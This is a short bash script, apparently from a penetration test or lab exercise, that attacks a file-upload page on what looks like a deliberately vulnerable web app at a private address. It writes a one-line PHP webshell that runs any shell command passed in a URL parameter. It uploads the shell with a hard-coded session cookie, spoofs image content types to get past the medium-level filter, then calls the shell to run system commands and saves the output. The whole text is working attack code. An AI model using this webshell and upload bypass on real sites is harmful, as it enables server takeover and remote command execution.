CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed'
BASE='http://10.31.0.87:3000/vulnerabilities/upload/'
mkdir -p evidence/upload

# webshell
cat > /tmp/aegis_shell.php <<'SHELL_EOF'
<?php if(isset($_GET['c'])){ echo shell_exec($_GET['c']); } ?>
SHELL_EOF

upload(){ L=$1; F=$2; CT=$3
  curl -s -b "PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed; security=$L" "$BASE" \
    -F "uploaded=@$F;type=$CT" -F "Upload=Upload" | grep -oE '<pre>.*</pre>|succesfully uploaded|not an image|cannot be uploaded' | head -c 300
  echo " <<== [$L] file=$F ct=$CT"
}

upload low /tmp/aegis_shell.php application/x-php
echo "-- executing shell at low"
curl -s -b "$CK" "http://10.31.0.87:3000/hackable/uploads/aegis_shell.php?c=id;pwd;uname -a" | tee evidence/upload/shell-exec.txt

echo; echo "== MEDIUM"
upload medium /tmp/aegis_shell.php application/x-php
upload medium /tmp/aegis_shell.php image/png
upload medium /tmp/aegis_shell.php image/jpeg
echo "-- exec"
curl -s -b "$CK" "http://10.31.0.87:3000/hackable/uploads/aegis_shell.php?c=id"
